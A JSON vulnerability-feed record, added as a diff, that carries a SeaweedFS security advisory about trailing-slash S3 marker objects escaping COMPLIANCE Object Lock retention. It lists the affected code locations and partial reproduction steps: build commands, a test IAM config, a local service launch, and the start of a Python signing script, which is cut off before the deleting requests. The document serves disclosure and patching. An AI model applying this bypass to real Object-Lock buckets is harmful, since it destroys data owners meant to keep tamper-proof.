@@ -1,0 +1,47 @@
+{
+  "id": "GHSA-4xpw-jvwx-h5g7",
+  "aliases": [],
+  "title": "Trailing-slash S3 marker objects bypass COMPLIANCE retention",
+  "summary": "# Trailing-slash S3 marker objects bypass COMPLIANCE retention\n\n## Summary\n\n`PutObject` handles keys ending in `/` and no larger than 1 KiB as directory markers before it checks versioning or Object Lock. The request accepts retention headers but stores no retention state and creates no version ID. `DeleteObject` later special-cases the same key and physically removes the marker without Object Lock enforcement. A principal with ordinary delete permission can therefore remove a visible COMPLIANCE-retained marker that an equivalent regular object protects.\n\n## Impact and affected scope\n\n- **Type:** Object Lock / retention bypass\n- **Affected component:** S3 trailing-slash marker creation, single-object delete, and multi-object delete\n- **Preconditions:** An Object-Lock-enabled bucket and an authenticated principal with ordinary object deletion permission\n- **Verified revision:** `8dcdb70594ae9e9c2ac07aa6d497f38d8c580448` on 27 August 2026\n- **Affected release range:** `<= 4.44`, as entered by the maintainer; patched version not yet specified\n\nThe demonstrated impact is deletion of the marker, ETag, and metadata before the retention date. SeaweedFS advertises zero content length for marker GETs, so this report does not claim loss of a normally retrievable payload.\n\n## Technical details\n\nThe trailing-slash `PUT` fast path runs before versioning and Object Lock validation. The matching delete paths call the directory-marker deletion routine before normal retention enforcement. This creates an object that appears to accept COMPLIANCE headers but is not protected by the WORM boundary.\n\nRelevant code:\n\n- `weed/s3api/s3api_object_handlers_put.go:133,161,179,205` - takes the marker fast path before retention/version processing.\n- `weed/s3api/s3api_object_handlers_delete.go:122,240,488` - deletes marker keys outside normal Object Lock enforcement.\n- `weed/s3api/s3api_directory_marker.go:28` - performs the marker operation.\n\n## Reproduction\n\nRun this only on an authorized disposable host with Go 1.26 and Python 3. Build the verified revision:\n\n```sh\ngit clone https://github.com/seaweedfs/seaweedfs.git\ncd seaweedfs\ngit checkout 8dcdb70594ae9e9c2ac07aa6d497f38d8c580448\ngo build -trimpath -o weed-poc ./weed\nmkdir -p poc-data poc-tmp\n```\n\nSave this as `s3-poc.json`:\n\n```json\n{\n  \"identities\": [\n    {\n      \"name\": \"retention-owner\",\n      \"credentials\": [\n        {\"accessKey\": \"retention-owner\", \"secretKey\": \"owner-secret\"}\n      ],\n      \"actions\": [\"Admin\"]\n    },\n    {\n      \"name\": \"eraser\",\n      \"credentials\": [\n        {\"accessKey\": \"eraser\", \"secretKey\": \"eraser-secret\"}\n      ],\n      \"policyNames\": [\"DeleteLockedObjects\"]\n    }\n  ],\n  \"policies\": [\n    {\n      \"name\": \"DeleteLockedObjects\",\n      \"content\": \"{\\\"Version\\\":\\\"2012-10-17\\\",\\\"Statement\\\":[{\\\"Effect\\\":\\\"Allow\\\",\\\"Action\\\":[\\\"s3:GetObject\\\",\\\"s3:GetObjectVersion\\\",\\\"s3:DeleteObject\\\",\\\"s3:DeleteObjectVersion\\\"],\\\"Resource\\\":[\\\"arn:aws:s3:::locked-bucket/*\\\"]}]}\"\n    }\n  ]\n}\n```\n\nStart the service:\n\n```sh\nTMPDIR=\"$PWD/poc-tmp\" WEED_TELEMETRY=false ./weed-poc mini \\\n  -dir=\"$PWD/poc-data\" \\\n  -ip=127.0.0.1 -ip.bind=127.0.0.1 \\\n  -master.port=19333 -volume.port=19340 -filer.port=18888 \\\n  -s3.port=18333 -s3.port.iceberg=0 -s3.port.lance=0 \\\n  -s3.config=\"$PWD/s3-poc.json\" -metricsPort=19326 \\\n  -webdav=false -admin.ui=false -master.telemetry=false \\\n  -master.volumeSizeLimitMB=64 -volume.preStopSeconds=0 \\\n  >seaweedfs-poc.log 2>&1 &\n```\n\nSave this as `verify_object_lock_marker.py`:\n\n```python\n#!/usr/bin/env python3\nfrom __future__ import annotations\n\nimport datetime\nimport hashlib\nimport hmac\nimport http.client\nimport sys\nimport time\nimport urllib.parse\n\nHOST = \"127.0.0.1\"\nPORT = 18333\nREGION = \"us-east-1\"\nSERVICE = \"s3\"\n\n\ndef _sign(key: bytes, message: str) -> bytes:\n    return hmac.new(key, message.encode(), hashlib.sha256).digest()\n\n\ndef request(method: str, path: str, query: list[tuple[str, str]] | None = None,\n            body: bytes = b\"\", extra_headers: dict[str, s...",
+  "published_at": "2026-11-09T19:45:26.000Z",
+  "modified_at": "2026-11-09T19:45:26.000Z",
+  "severity": {
+    "level": "medium",
+    "score": 5.3,
+    "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:L/VA:L/SC:N/SI:N/SA:N",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "affected": [
+    {
+      "product": "seaweedfs",
+      "ranges": [
+        {
+          "introduced": "0",
+          "last_affected": "4.44"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-4xpw-jvwx-h5g7",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-4xpw-jvwx-h5g7",
+      "url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-4xpw-jvwx-h5g7",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:6973d6b823899f75daba99ddab22967dcecabde347653a1ab4f1ded65a1215b4",
+  "note": null
+}
